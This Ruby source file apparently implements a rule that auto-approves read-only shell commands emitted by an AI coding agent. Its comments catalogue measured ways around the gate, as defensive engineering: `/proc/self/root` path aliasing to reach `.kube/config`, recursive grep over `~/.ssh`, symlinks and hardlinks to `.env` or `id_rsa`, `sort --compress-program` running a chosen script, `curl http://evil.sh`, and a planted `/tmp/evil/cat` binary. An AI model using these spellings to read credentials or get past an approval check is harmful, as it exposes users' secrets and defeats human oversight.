# frozen_string_literal: true

require "pathname"

module Lain
  module Approval
    # The one rule in `lib/` that can APPROVE a shell command with no human and
    # no LLM anywhere in the loop.
    #
    # It reads the PARSED TERM rather than the model's string -- the door
    # {Rule::Call#term} opened, and the only thing in `lib/` that walks through
    # it. `cat README.md | head -20` stops costing a round trip to a person;
    # {#decide} answers nil for anything else, so the ladder runs on unchanged.
    #
    # == A conjunction of independent predicates, and that shape is the point
    #
    # Every one holds, or the rule says nothing:
    #
    # 1. the tool is the one whose input is a shell command;
    # 2. the verdict ALLOWS, so a term exists to read at all;
    # 3. every stage's argv0 is a BARE NAME, and every one is on {PROGRAMS}
    #    or is a {VERSION_PROBES} stage;
    # 4. every word of every stage classifies ORDINARY, and not by exemption;
    # 5. no stage carries a flag that takes it outside its own arguments;
    # 6. no word traverses a path-aliasing pseudo-filesystem;
    # 7. THE ROOT PREDICATE: every word, and the call's own cwd, lands under
    #    the project root -- as written, and as the filesystem resolves it;
    # 8. THE CONTENT PREDICATE: no word names a file closed to other users, or
    #    one whose first bytes carry a region a masked read would withhold.
    # 9. THE LANDING PREDICATE: every word classifies ordinary where it LANDS,
    #    and not by exemption -- predicate 4 judges the name that was written,
    #    and a name can point at a file with a different one. `which` is the
    #    one exception: a bare word it is given names a program, not a file.
    # 10. THE TOOLCHAIN PREDICATE: no rustup proxy probes under a
    #     `rust-toolchain` file in its cwd or any directory above it.
    # 11. THE LISTING PREDICATE: every entry of every directory an `ls` lists
    #     classifies ordinary, by its own name and where it lands, and not by
    #     exemption -- `ls` prints the names `list_files` withholds.
    # 12. THE CLASS PREDICATE, when the rule is built with `classes:`: every
    #     stage's program, every wrapper around it and every file it runs
    #     resolves to a system file, or a user file unchanged this lineage and
    #     shadowing nothing on PATH, with no PATH or env anomaly.
    # 13. THE OPERAND PREDICATE: an `rg` searches only files it is named, each
    #     a regular file, since with none or a directory it walks a tree. It
    #     reads the slots by position, which holds only because `rg`'s table
    #     admits no option that takes a value.
    # 14. THE WALK PREDICATE: a `find` lists a tree of at most {WALK_BOUND}
    #     entries, each ordinary as an `ls` entry must be, since it prints names.
    # 15. THE REPOSITORY PREDICATE: no `git` stage runs in a repository whose
    #     own config names a program, includes another file or moves the tree.
    # 16. THE GIT NAME PREDICATE: every file name and every file's bytes a
    #     `git` stage prints classifies ordinary, as an `ls` entry must.
    #
    # Predicate 2 has one widening: where the verdict ABSTAINS rather than
    # denies, {Shell::Reading} reads the string itself, accepting only leading `cd`s
    # bound by `&&`, plain quoting, `2>&1` or a /dev/null discard after a stage,
    # and `|`, `&&` and `;` (no `;` after a `cd`), and the term it builds is
    # judged by every predicate. Such a command still runs through `sh -c`, so
    # the reading refuses anything a shell would read differently.
    #
    # {#approvable?} and {#vouchable?} hold the predicates as one conjunction,
    # and every predicate but 13 is total over a term on its own, so another is
    # one more `&&` plus one more method. That is not tidiness, and it has been TESTED rather than claimed:
    # predicates 6, 7, 8 and 9 were each added after the rest shipped, and each
    # cost one `&&` and one method here -- two for 9, which needs a rescue of
    # its own -- and no existing predicate's logic changed.
    # Predicates 7 and 8 also each cost a message on the injected factory
    # (`#confinement`, `#content`), and 7 the lexical test {Root} answers.
    # Predicate 12 cost `#executables` on the factory, and sits in {#decide}
    # rather than the conjunction only because its answer also names the reason.
    #
    # == Predicate 6: a path can be spelled so the classifier cannot see it
    #
    # `/proc/self/root` aliases `/`, and {Sensitivity} is LEXICAL, so a path
    # wearing that prefix stops matching every home-anchored rule --
    # `descends?(path, home)` is simply false. MEASURED through the real ladder:
    # `cat /proc/self/root<HOME>/.kube/config` was APPROVED while the plain
    # absolute spelling denied at triage. No attacker-planted file, every Linux
    # box, a pure string the model emits. {ALIASING} carries the mechanics.
    #
    # It does NOT belong in the classifier, and that was checked rather than
    # assumed: that path's basename is `config`, so no `Rule.within("proc",
    # name: ...)` can reach it, and a real classifier fix means resolving before
    # classifying -- filesystem access, a TOCTOU window, and the design the plan
    # defers. Refusing the WORD needs none of that.
    #
    # == The root predicate: automatic approval reads inside the project
    #
    # MEASURED before it existed: `.pgpass`, `grep TOKEN .bash_history` and
    # `/var/log/auth.log` were each approved with nobody asked, because the
    # classifier names credential SHAPES and no table of shapes is a boundary.
    #
    # WHAT IT GUARANTEES: at the moment of the decision, every word of the term
    # and the call's cwd land under the root twice over -- lexically under the
    # root as the session spells it, and, after `File.realpath` of the longest
    # prefix on disk, under the root's own real path. A
    # symlink in the checkout (`h -> $HOME`, `link -> /`), a dangling link, and
    # a `link/..` that climbs from the target all refuse, and so does anything
    # that cannot be resolved. It does NOT survive a link created between the
    # decision and the exec; no allowlisted program creates one.
    #
    # Every word is checked, not only the path-shaped ones, because a bare `..`
    # climbs out with no separator in it; a grep pattern that happens to read
    # as an absolute path is refused too, which costs a prompt. A session whose
    # root holds `$HOME`, or was never detected, confines nothing at all --
    # {CLI::Wiring::BoardBuild.confinement} says why.
    #
    # The real-path half lives HERE and not in {Sensitivity}: this rule
    # authorizes an exec that follows links, while the classifier's contract is
    # that it makes no syscall. The classifier alone still reads
    # `h/.config/gh/hosts.yml` as ordinary.
    #
    # == The content predicate: a name is not what a file holds
    #
    # MEASURED before it existed: a PKCS#8 key in `ops_readme.txt`, a hardlink
    # to a key in `~/.ssh`, a 0600 `deploy_key` and `.vault-token` were each
    # printed to the model with nobody asked, while `read_file` of the same
    # bytes masked them. Predicate 4 can only ever judge the name, a word or a
    # directory that names a secret included. So an existing regular file must
    # be readable by everyone, fit the bounded scan (64 KiB), and carry no
    # region; {CLI::Wiring::BoardBuild::Classifiers::Content}
    # holds the mechanics. It too lives outside {Sensitivity}, for the same
    # reason.
    #
    # == The landing predicate: a name is not what the kernel opens either
    #
    # MEASURED before it existed, in a project holding a `.env` and an `id_rsa`:
    # `cat notes.txt` and `cat changelog.txt`, two ordinary-named symlinks to
    # them INSIDE the root, were both approved with nobody asked -- the second
    # from the DENIED tier -- while the direct spelling of each refused.
    # Predicate 7 asks only WHERE a word lands and both landed inside; predicate
    # 8 asks what the bytes hold and a config file holds no key-shaped region;
    # predicate 4 classifies the word `notes.txt`, which is ordinary. Nothing in
    # the conjunction classified the name the kernel would actually open.
    #
    # So this one classifies the LANDING, through the classifier predicate 4
    # already built and the confinement predicate 7 already resolved: no new
    # message on the factory and no syscall class this call was not making. It
    # did cost one reader on the confinement -- `#real_landing`, which is the
    # resolution predicate 7 performs anyway and used to discard.
    # The resolving stays HERE for predicate 7's reason, and that reason is now
    # load-bearing twice: the classifier's whole contract is that it makes no
    # syscall, so the CALLER that authorizes a link-following exec is what has
    # to resolve before it asks.
    #
    # It classifies TWO spellings of that landing, because a project reached
    # through a link has two spellings of its own ROOT and a `/`-anchored config
    # rule is written against the one the session uses. The kernel's absolute
    # spelling is what catches a link whose target the session's own root names;
    # the same landing RELATIVE to where the command will run, which the
    # classifier resolves against the session's root, is what catches the file a
    # project rule names when the root itself is spelled through a link. Either
    # spelling being gated, denied, unreadable or exempt is a refusal.
    #
    # == What it does not cover, MEASURED rather than reasoned about
    #
    # A **hardlink**. `File.link($root/.env, $root/hard.txt)` and then
    # `cat hard.txt` is APPROVED -- measured, `nlink` 2 and the same inode.
    # `realpath` sees nothing to resolve, because a hardlink is a second name
    # for the inode rather than a path to follow, so this predicate reads an
    # ordinary name landing on an ordinary name. Predicate 8 is what catches the
    # case that motivated it, a hardlink to a KEY, and it catches it by the
    # bytes; a hardlink to a file gated only by its NAME survives both. Closing
    # it means comparing inodes against every gated name a directory holds,
    # which is a different mechanism from classifying a path.
    #
    # A `/`-anchored config rule naming a link INSIDE the root. With
    # `gated = ["/vault/"]` and `vault -> store`, `cat vault/secret.txt` refuses
    # at predicate 4 and `cat store/secret.txt` is APPROVED -- measured, and
    # true before this predicate existed too. Resolution deletes a link from
    # every landing, so a rule written against one matches no spelling of it: a
    # config has to name the real directory to bind, and `gated = ["/store/"]`
    # then refuses both spellings. The two spellings here are the root's, not
    # one per link on the path -- a path crossing several has a spelling for
    # each subset of them, which is not a set anything can classify.
    #
    # It also cannot save a word whose landing does not exist: a dangling link
    # has none, so {#ordinary_landing?} answers false rather than raising, which
    # is the direction predicate 7 already fails in.
    #
    # == Predicate 4 is "is ORDINARY", never "is not denied"
    #
    # {Sensitivity} is THREE-valued, and the GATED tier is where this codebase
    # put the credential files it declined to hard-refuse -- `.env`, `*.pem`,
    # `credentials.json`, `.git-credentials`, `terraform.tfstate`. Its header
    # says why: *"A spurious match here costs one prompt, so these are the half
    # that widens."* Measured, all five reach `allow`, so "not denied" approves
    # every one. Requiring `ordinary` also catches `Sensitivity::MALFORMED`, so
    # a word the classifier could not READ cannot pass as un-denied.
    #
    # An ordinary verdict whose reason is `exempt` does not count. The
    # `sensitivity exempt:` key tells a HUMAN's prompt that one file is not
    # worth asking about; it lifts the prompt, never this approval. Measured,
    # one basename exemption for a fixture `.env` approved `cat` of every
    # `.env` in the tree with nobody asked.
    #
    # And it classifies EVERY word itself, whatever the spelling.
    # {Escalation::Triage::Command} DOWNGRADES a denied word with no separator
    # from deny to abstain -- measured, `cat .netrc` abstains where
    # `cat ./.netrc` denies -- because "the call still reaches a human because
    # Triage downgrades every allow anyway". This rule destroys that premise, so
    # it cannot lean on it: Triage running first is ordering, and ordering is
    # not the safety property.
    #
    # == Predicate 5 exists because the check is over the TERM and the hazard is
    # over the READ SET
    #
    # They coincide only for programs whose read set is exactly their literal
    # arguments. MEASURED: `grep -h -r . /home/u/.ssh` reaches `allow` with EVERY
    # word classifying ordinary, the directory included -- the denied rule names
    # `id_*` INSIDE `.ssh` and the directory itself is not a match. It prints a
    # private key, which {Escalation::Triage} records nothing lifts: not a
    # policy, not `/mode bypass`, not `ApproveAll`, not `sensitivity exempt:`.
    # Predicate 4 cannot save it. So each entry carries the flags that
    # disqualify it, and a stage naming one is refused. The `~/.ssh` spelling
    # of the same command reaches here too: {Shell::Verdict} expands a leading
    # `~/` to the child's HOME, so the term carries the absolute path. That
    # argv is what runs, except under {Exec::Docker} for a pipe or a discard:
    # it refuses that term, so the string runs under `sh -c` in a container
    # that is not lent the host HOME and holds no host file outside its mounts.
    #
    # == A BARE name only, and this is the opposite of the exclusion set
    #
    # `Shell::Doubts#programs` BASENAMES, which is correct for a denylist:
    # `/usr/bin/curl` must not evade an exclusion of `curl`. Run the same
    # matching against an allowlist and `/tmp/evil/cat README.md` basenames to
    # an entry here and is approved with no human -- an attacker-planted binary.
    # So argv0 is compared whole, and a `/` anywhere in it disqualifies.
    #
    # == Where this stands, which is a rung and not an answer
    #
    # The governing principle this chunk was planned around: auto-approval must
    # never be more permissive than a careful human reading the same command
    # string, and that is a FLOOR rather than a target. A qualified argv0 is
    # refused under it; without `classes:`, `PATH` is not checked, so this rule
    # inherits whatever trust the string itself invites. That is a statement of
    # where the implementation stands and never an argument for staying there.
    #
    # A PROGRAM NAME IS NOT AN IDENTITY. `PATH` is inherited and uncontrolled,
    # so a bare `cat` runs whatever `execvp` finds first. Under `classes:` the
    # resolved class decides: a system file, or a user file unchanged this
    # lineage and shadowing nothing on PATH, may run with nobody asked; a
    # project file, a fresh or shadowing user file, an unresolved stage or a
    # PATH anomaly abstains. The stage class alone never approves an
    # interpreter or build tool: what it runs is classed too, and a run file
    # that cannot be told abstains. Without `classes:` the name is still all
    # this rule reads.
    class ComposedTerm < Rule
      # Named rather than sniffed, on {Escalation::Triage::COMMAND_TOOLS}'
      # precedent -- a different rule from that list, not a copy of it. A
      # command tool holding no {Shell::Verdict} has no term to offer and hands
      # its backend the model's String either way, so approving one would
      # approve an `sh -c`; only a tool that really parses belongs here.
      TOOL = "bash"

      APPROVED = "every stage is a bare allowlisted reader over ordinary words: %<programs>s"

      # The pseudo-filesystems whose entries ALIAS another path. `/proc/self/root`
      # is `/`, `/proc/self/cwd` is the working directory, `/proc/self/fd/N` and
      # `/dev/fd/N` are whatever that descriptor holds, and `/sys` exposes the
      # kernel's own view. Matched as a path SEGMENT rather than a prefix, so a
      # relative spelling from a cwd at or above the root (`proc/self/root/...`),
      # a doubled separator (`//proc/...`) and a climb (`../proc/...`) are all
      # caught -- MEASURED, all three.
      #
      # `/dev` at large is NOT here; only `dev/fd`. `/dev/stdin` and
      # `/etc/shadow` are the root predicate's to refuse, since both lie
      # outside any project, and folding them in here would be a tier change on
      # an unmeasured argument.
      #
      # It over-refuses a checkout holding a `proc`, `sys` or `dev/fd`
      # directory. One prompt, failing closed -- the same bargain the
      # classifier's own `within("proc")` entry makes.
      #
      # == Variants that look like gaps and are not, RECORDED so nobody "fixes" them
      #
      # `/PROC`, `/Proc`, `/proc.` and `/proc%2f` all pass this regex. Each was
      # checked with `test -e` ON THIS PLATFORM and none exists: procfs is
      # case-sensitive, and nothing percent-decodes because the term arm starts
      # no shell. They are unreachable paths rather than bypasses -- a
      # measurement on Linux here, NOT a claim about every platform, and worth
      # re-running rather than assuming if that ever changes.
      #
      # The reason to write it down: an auditor will find these variants, and
      # without this note will either re-derive the measurement or close them by
      # matching case-insensitively and percent-decoding -- which widens what
      # this predicate refuses on an argument nobody checked.
      ALIASING = %r{(\A|/)(proc|sys|dev/fd)(/|\z)}

      SEPARATOR = "/"
      LONG = "--"
      DASH = "-"

      Flags = Data.define(:short, :long)

      # The flags that disqualify a stage naming one allowlisted program: the
      # SHORT letters and the LONG names the real binary accepts. Named for the
      # one thing it holds -- an empty one says "no flag disqualifies this
      # program", where a class called `Program` read it as "an empty program".
      # Reopened rather than written in the `Data.define` block, where a
      # constant would scope to {Approval} instead.
      #
      # == The matcher is deliberately blunter than getopt
      #
      # Four evasions were measured against the real binaries, and all four are
      # closed by scanning characters rather than parsing options:
      # `sort -ro/tmp/out` wrote through a BUNDLED, ATTACHED `-o`; `grep -hr`
      # recursed; `wc --f=names.nul` read a name list through an ABBREVIATED
      # long option, GNU `getopt_long` taking any unambiguous prefix; and
      # `grep --exclude-from=/etc/passwd` opened a file by EXTENDING a listed
      # flag rather than abbreviating one.
      #
      # So a short word disqualifies when ANY of its characters is a
      # disqualifying letter, and a long word when it is a prefix of a
      # disqualifying name OR a disqualifying name is a prefix of IT. The
      # matcher runs BOTH ways, because a one-way one is only as good as the
      # direction somebody thought to test -- and the direction nobody tested
      # was the one that auto-approved a file read.
      #
      # It over-refuses, and every over-refusal was MEASURED rather than
      # predicted: `sort -to in` abstains where `sort -t o in` is approved,
      # `grep -e -r lib` abstains where `grep -e foo lib` is approved,
      # `grep -- -r lib` abstains because every word is scanned, and both
      # `grep --files-with-matches` and `grep --files-without-match` -- the
      # harmless `-l` and `-L` -- abstain because each extends the listed
      # `--file`. The LONG spelling only: `grep -l` and `grep -L` still approve,
      # because the short matcher is per-character and neither letter
      # disqualifies. That is the right way to be wrong: a
      # refusal costs one prompt, and until this rule existed every one of these
      # commands cost that prompt anyway.
      class Flags
        # @param short [Array<String>] the disqualifying single letters
        # @param long [Array<String>] the disqualifying long options, `--` included
        def initialize(short: [], long: [])
          super(short: short.map(&:-@).freeze, long: long.map(&:-@).freeze)
        end

        def admits?(arguments) = arguments.none? { |word| disqualifies?(word) }

        # @return [Boolean] whether any word is one of these flags
        def any_in?(arguments) = !admits?(arguments)

        private

        def disqualifies?(word)
          # The end-of-options marker is not an option. Every word is scanned
          # whether it follows one or not, which refuses `grep -- -r` and is
          # cheaper to be sure of than a positional state machine.
          return false if word == LONG
          return extends_or_abbreviates?(word.split("=", 2).first) if word.start_with?(LONG)
          return word.delete_prefix(DASH).chars.intersect?(short) if word.start_with?(DASH)

          false
        end

        # Symmetric, deliberately. `flag.start_with?(written)` alone catches
        # `--rec` for `--recursive` and MISSES `--exclude-from` for `--exclude`.
        def extends_or_abbreviates?(written)
          long.any? { |flag| flag.start_with?(written) || written.start_with?(flag) }
        end
      end

      # What an UNLISTED program's flags admit, which is nothing -- so
      # {#unflagged?} is total over a term on its own rather than depending on
      # {#allowlisted?} having run first. That independence is what let
      # predicate 6 be added as one `&&` and one method.
      class Unlisted
        def admits?(_arguments) = false
      end
      private_constant :Unlisted

      VERSION = "--version"

      # `sleep` with one plain number of at most 3 digits, which keeps `infinity`,
      # `1d` and exponents out; the bash tool's timeout is what bounds a long wait.
      class Pause
        NUMBER = /\A\d{1,3}(\.\d+)?\z/

        def admits?(arguments) = arguments.one? && arguments.first.match?(NUMBER)
      end
      private_constant :Pause

      UNLISTED = Unlisted.new.freeze
      private_constant :UNLISTED

      # A program approved only for named leading words, or for `--version`
      # alone. The named words must come first, so a writing verb of the same
      # program never rides in behind a reading one.
      class Subcommands
        # @param allowed [Array<Array<String>>] the leading words that are reads
        def initialize(allowed)
          @allowed = allowed.map(&:freeze).freeze
        end

        def admits?(arguments) = arguments == [VERSION] || @allowed.any? { |lead| arguments.first(lead.size) == lead }
      end
      private_constant :Subcommands

      # A program whose first argument names a subcommand, each read by a table
      # of its own; any word before it, a global option included, is refused.
      class Reads
        # @param subcommands [Hash{String=>#admits?}]
        def initialize(subcommands)
          @subcommands = subcommands.freeze
          freeze
        end

        def admits?(arguments)
          subcommand, *rest = arguments
          arguments == [VERSION] || @subcommands.fetch(subcommand, UNLISTED).admits?(rest)
        end
      end
      private_constant :Reads

      # The options a program takes with no value, as an allowlist. Any other
      # option could take the next word as its value, and the operand predicate
      # reads the pattern and file slots by position; MEASURED, `--regexp=. .`,
      # `-e . -e a.md` and `-T md a.md` each walked the cwd when a table only
      # refused the dangerous flags. Words after `--` are operands.
      class Valueless
        # @param short [String] the letters, any of which may be bundled
        # @param long [Array<String>] whole words, with no abbreviation; a single-dash word here is
        #   one whose letters are not a bundle, such as git's `-uall`
        def initialize(short:, long:)
          @short = short.chars.freeze
          @long = long.freeze
          freeze
        end

        def admits?(arguments)
          arguments.take_while { _1 != LONG }.select { _1.start_with?(DASH) && _1 != DASH }.all? { known?(_1) }
        end

        private

        def known?(word) = @long.include?(word) || (!word.start_with?(LONG) && bundled?(word))

        def bundled?(word) = word.delete_prefix(DASH).chars.all? { @short.include?(_1) }
      end
      private_constant :Valueless

      # git's `log` and `diff` each need a flag table and a requirement at once,
      # and the program table holds one object per subcommand.
      Both = Data.define(:first, :second) do
        def admits?(arguments) = first.admits?(arguments) && second.admits?(arguments)
      end
      private_constant :Both

      # A `git log` admitted only when it names its format and every format it
      # names prints no commit body, no note and no signature, which runs gpg.
      class Bodiless
        FORMAT = /\A--(oneline\z|format(=|\z)|pretty(=|\z))/
        NAMED = %w[oneline short reference].freeze
        PLACEHOLDER = "%"
        BODY = /%[-+ ]?(?:[bBNG]|\(trailers)/

        def admits?(arguments)
          formats = arguments.grep(FORMAT)
          formats.any? && formats.all? { bodiless?(_1) }
        end

        private

        def bodiless?(word)
          value = word.partition("=").last
          word == "--oneline" || NAMED.include?(value) || (value.include?(PLACEHOLDER) && !value.match?(BODY))
        end
      end
      private_constant :Bodiless

      # find's options and actions are whole words, so they are matched whole.
      # `-H`, `-L`, `-D` and `-O` come before its start points.
      class Primaries
        LEADING = /\A-[HLDO]/

        # @param refused [Array<String>]
        def initialize(refused)
          @refused = refused.freeze
          freeze
        end

        def admits?(arguments) = arguments.none? { @refused.include?(_1) || _1.match?(LEADING) }
      end
      private_constant :Primaries

      # A printf format whose width or precision runs to 4 digits or more, or is taken from an argument by `*`, can
      # print gigabytes from a few bytes of command.
      class Narrow
        AMPLIFYING = /%[^a-zA-Z%]*(?:\d{4}|\*)/

        def admits?(arguments) = arguments.none? { _1.match?(AMPLIFYING) }
      end
      private_constant :Narrow

      # `sed -n` with scripts that only print lines, by number, range or
      # pattern: nothing that writes, reads another file, runs or substitutes.
      class Prints
        ADDRESS = %r{(?:\d+|\$|/[^/\\\n]*/)}
        SCRIPT = /\A#{ADDRESS}(?:,#{ADDRESS})?p(?:;#{ADDRESS}(?:,#{ADDRESS})?p)*\z/
        QUIET = %w[--quiet --silent].freeze
        LONG = [*QUIET, "--regexp-extended", "--separate", "--unbuffered"].freeze
        SHORT = /\A-[nErsu]+\z/
        EXPRESSION = "-e"
        EXPRESSION_LONG = /\A--expression=/

        def admits?(arguments)
          scripts, options, operands = parts(arguments.dup)
          scripts = operands.first(1) if scripts.empty?
          !options.nil? && quiet?(options) && scripts.any? && scripts.all? { _1.to_s.match?(SCRIPT) }
        end

        private

        # @return [Array(Array<String>, Array<String>, Array<String>)] scripts,
        #   options and operands; nil options for a word no table here reads
        def parts(words)
          scripts = []
          options = []
          operands = []
          until words.empty?
            word = words.shift
            if word == EXPRESSION then scripts << words.shift
            elsif word.match?(EXPRESSION_LONG) then scripts << word.delete_prefix("--expression=")
            elsif LONG.include?(word) || word.match?(SHORT) then options << word
            elsif word.start_with?(DASH) then return [scripts, nil, operands]
            else operands << word
            end
          end
          [scripts, options, operands]
        end

        def quiet?(switches) = switches.any? { QUIET.include?(_1) || (_1.match?(SHORT) && _1.include?("n")) }
      end
      private_constant :Prints

      # The git and diff options that print a file's bytes or a patch, write a
      # file, read one, run a program or search the content of history.
      HISTORY_SHORT = %w[p u U c W O S G L].freeze
      HISTORY_LONG = %w[--patch --unified --patch-with-stat --patch-with-raw --word-diff --color-words --cc
                        --remerge-diff --combined-all-paths --full-diff --function-context --binary --output
                        --ext-diff --textconv --show-signature --notes --show-notes --pickaxe-all --pickaxe-regex
                        --find-object --check --no-index --submodule --orderfile].freeze
      # The log forms that list file names, which no name check holds.
      NAMES = %w[--stat --name-only --name-status --numstat --raw --summary --dirstat --compact-summary].freeze
      STAT = /\A--(stat|shortstat)(=|\z)/
      private_constant :HISTORY_SHORT, :HISTORY_LONG, :NAMES, :STAT

      # What git says a stage would print, asked through {Repository.git}: the
      # names a status or ls-files lists, whether each rev peels to a tree, and
      # whether refreshing the index would run a hook. Injected, so a replay can
      # say it runs live.
      module Listing
        FORMS = { "status" => %w[status --porcelain=v1 -z], "ls-files" => %w[ls-files -z --full-name] }.freeze
        MOVED = /[RC]/
        SEPARATOR = "\0"
        HOOK = "hooks/post-index-change"

        # @param subcommand [String] `status` or `ls-files`
        # @param directory [String] where the stage runs
        # @param operands [Array<String>] its pathspecs
        # @param modes [Array<String>] its untracked-files options, so a status folds what the stage folds
        # @return [Array<String>, nil] named from the tree's top; nil where git does not answer cleanly
        def self.names(subcommand, directory, operands, modes = [])
          output = Repository.git(*FORMS.fetch(subcommand), *modes, "--", *operands, directory:)
          fields = output&.split(SEPARATOR)
          subcommand == "status" && fields ? paths(fields) : fields
        end

        # @param directory [String]
        # @param revisions [Array<String>] rev-shaped words
        # @return [Boolean] whether every one peels to a tree, as a commit, a tree or a tag to either does
        def self.trees?(directory, revisions)
          !Repository.git("rev-parse", "--end-of-options", *revisions.map { "#{_1}^{tree}" }, "--", directory:).nil?
        end

        # Asked without the setting that turns hooks off, which would hide the
        # user's own `core.hooksPath`; an unanswered question counts as a hook.
        #
        # @param directory [String]
        # @return [Boolean]
        def self.hooked?(directory)
          hook = Repository.git("rev-parse", "--git-path", HOOK, directory:, settings: Repository::QUIET)
          hook.nil? || File.executable?(File.expand_path(hook.chomp, directory))
        end

        # A rename or copy entry is followed by the name it had.
        def self.paths(fields)
          paths = []
          until fields.empty?
            entry = fields.shift
            paths << entry[3..]
            paths << fields.shift if entry[0, 2].match?(MOVED)
          end
          paths
        end
        private_class_method :paths
      end

      # The git name predicate: a git stage prints only names and bytes the
      # classifier lets an `ls` entry or a `cat` print. A status or ls-files is
      # asked of git itself, over the stage's own pathspecs, and a directory a
      # status folds is judged by its name, as `ls` prints one; a show reads
      # each `rev:path` from the tree's top, or from the cwd for `./` and `../`;
      # a log or diff that prints a patch names every path it prints, each a
      # regular file today, against revs that each peel to a tree. A form whose
      # paths cannot be named -- no path, a directory, a glob, a whole commit,
      # a blob -- is the judge's. A status or diff refreshes the index, which
      # runs a `post-index-change` hook, so neither runs beside one.
      class Printed
        REV_WORD = %r{[\w@][\w./~^@{}+-]*}
        REV = /\A#{REV_WORD}\z/
        # git splits at the first colon outside braces, so a path holding a
        # colon or a brace is one this split could have misplaced.
        REV_PATH = /\A#{REV_WORD}:(?<path>[^\/:}][^:}]*)\z/m
        RANGE = /\.\.\.?/
        FROM_CWD = %r{\A\.\.?/}
        PATHSPEC_MAGIC = /[*?\[\\]|\A:/
        OPTION = /\A--?[^-]/
        UNTRACKED = /\A(?:-u|--untracked-files)/
        FOLDED = "/"
        MARKER = ".git"
        REFRESHING = %w[status diff].freeze
        # `--dd` is a first-parent patch of every merge, though no flag says patch.
        PATCH = Flags.new(short: %w[p u U], long: %w[--patch --unified --dd])
        # A followed path prints the patches of the names it had before.
        FOLLOW = Flags.new(long: %w[--follow])

        # An option could move where the path is read from, so none is taken.
        class Shown
          def admits?(arguments) = arguments.any? && arguments.all? { _1.match?(REV_PATH) }
        end

        # Options only: a branch listing names no branch.
        class Unnamed
          def admits?(arguments) = arguments.all? { _1.match?(OPTION) }
        end

        PATCHED_SHORT = (HISTORY_SHORT - %w[p u U]).freeze
        # `--stdin` reads more revs, `--` and pathspecs from a pipe, none of them a word here.
        PATCHED_LONG = (HISTORY_LONG - %w[--patch --unified] + %w[--diff-merges --stdin]).freeze
        STATUS = %w[--short --branch --long --porcelain --porcelain=v1 --porcelain=v2 --null --show-stash
                    --ahead-behind --no-ahead-behind --renames --no-renames --untracked-files
                    --untracked-files=all --untracked-files=normal --untracked-files=no -u -uall -unormal -uno].freeze
        LS_FILES = %w[--cached --deleted --modified --stage --unmerged --full-name --deduplicate
                      --error-unmatch].freeze
        BRANCH = %w[--all --remotes --verbose --list --show-current --no-color --no-column].freeze
        GIT = Reads.new(
          "log" => Both.new(Flags.new(short: PATCHED_SHORT, long: PATCHED_LONG + NAMES), Bodiless.new),
          "diff" => Flags.new(short: PATCHED_SHORT, long: PATCHED_LONG),
          "rev-parse" => Flags.new,
          "show" => Shown.new,
          "status" => Valueless.new(short: "sbz", long: STATUS),
          "ls-files" => Valueless.new(short: "cdmstuz", long: LS_FILES),
          "branch" => Both.new(Valueless.new(short: "alrv", long: BRANCH), Unnamed.new)
        )

        # @param arguments [Array<String>] the stage's argv after `git`
        # @param directory [String] where the stage runs, resolved
        # @param ordinary [#call] `absolute path -> Boolean`, the `ls` entry predicate
        # @param git [#names, #trees?, #hooked?] what git says, {Listing} in production
        # @param facts [#file?, #exist?, #symlink?] the disk the rule's factory reads
        def initialize(arguments, directory, ordinary, git:, facts:)
          @subcommand, *@arguments = arguments
          @directory = directory
          @ordinary = ordinary
          @git = git
          @facts = facts
        end

        def held?
          unhooked? && printed?
        end

        private

        def printed?
          case @subcommand
          when "status", "ls-files" then listed?
          when "show" then shown?
          when "log" then !patch? || named?
          when "diff" then (stat? && !patch?) || named?
          else true
          end
        end

        def unhooked? = !REFRESHING.include?(@subcommand) || !@git.hooked?(@directory)

        def patch? = PATCH.any_in?(@arguments)

        def stat? = @arguments.any? { _1.match?(STAT) }

        # For ls-files `-u` is --unmerged, not an untracked mode.
        def modes = @subcommand == "status" ? options.grep(UNTRACKED) : []

        def listed?
          top = top_level
          names = @git.names(@subcommand, @directory, operands, modes) if top
          names && names.size <= WALK_BOUND && names.all? { @ordinary.call(File.join(top, _1.chomp(FOLDED))) }
        end

        def shown?
          top = top_level
          top && @arguments.all? do |word|
            path = word[REV_PATH, :path]
            named_file?(within(path.match?(FROM_CWD) ? @directory : top, path))
          end
        end

        # Without `--`, git reads a word as a rev only while no file has that
        # name, so a word that is not rev-shaped, or names something on disk, is
        # a path here as well.
        def named?
          revs, paths = revisions.partition { revision?(_1) }
          paths += pathspecs
          FOLLOW.admits?(@arguments) && paths.any? &&
            paths.all? { !_1.match?(PATHSPEC_MAGIC) && named_file?(within(@directory, _1)) } && trees?(revs)
        end

        def trees?(revs)
          ends = revs.flat_map { _1.split(RANGE) }.reject(&:empty?)
          ends.empty? || @git.trees?(@directory, ends)
        end

        def revision?(word)
          path = within(@directory, word)
          word.match?(REV) && !@facts.exist?(path) && !@facts.symlink?(path)
        end

        def options = @arguments.take_while { _1 != LONG }

        def revisions = options.grep_v(OPTION)

        def pathspecs = @arguments.drop(options.size + 1)

        # For a status or ls-files every one is a pathspec.
        def operands = revisions + pathspecs

        def named_file?(path) = @facts.file?(path) && @ordinary.call(path)

        def within(base, word) = Pathname.new(base).join(word).cleanpath.to_s

        def top_level = Pathname.new(@directory).ascend.find { @facts.exist?(_1.join(MARKER).to_s) }&.to_s
      end
      private_constant :Printed

      # THE ALLOWLIST, derived from what each program does with the argv it is
      # GIVEN: reads only, writes nothing, fetches nothing, executes nothing.
      #
      # NOT `Shell::Pipeline::STDIN_SAFE`, which answers "safe under
      # attacker-chosen STDIN" and is applied to the stages AFTER the first.
      # Measured: `gzip`, `xz`, `zstd`, `sort` and `shuf` are all on that list,
      # and `gzip important.log`, `sort -o out in` and `curl http://evil.sh | cat`
      # all reach `allow` while replacing, overwriting and fetching.
      #
      # Every entry and every flag was read off the real binary's `--help`, and
      # the four hazards a program's reputation does not advertise were each RUN:
      # `sort --compress-program` executed a script of the caller's choosing,
      # `sort --files0-from` and `wc --files0-from` read files named in another
      # file (or on stdin), `sort --random-source` opened an arbitrary path, and
      # `tail -f` never returned. An empty entry is a claim somebody made after
      # reading the flags; there are no blanks.
      PROGRAMS = {
        # Reads exactly its arguments and writes nothing. Its whole option set
        # is display formatting.
        "cat" => Flags.new,
        # A prefix and a suffix of exactly their arguments. `tail` also FOLLOWS,
        # and `-f`/`-F` never return -- the read set is unchanged, so this is a
        # narrowing past predicate 5's letter: an auto-approved call that cannot
        # finish holds the tool for its whole timeout with nobody having chosen
        # that.
        "head" => Flags.new,
        "tail" => Flags.new(short: %w[f F], long: %w[--follow --retry]),
        # Counts and numbers exactly its arguments -- except that `wc` will take
        # the LIST of files to count from another file, or from stdin.
        "wc" => Flags.new(long: %w[--files0-from]),
        "nl" => Flags.new,
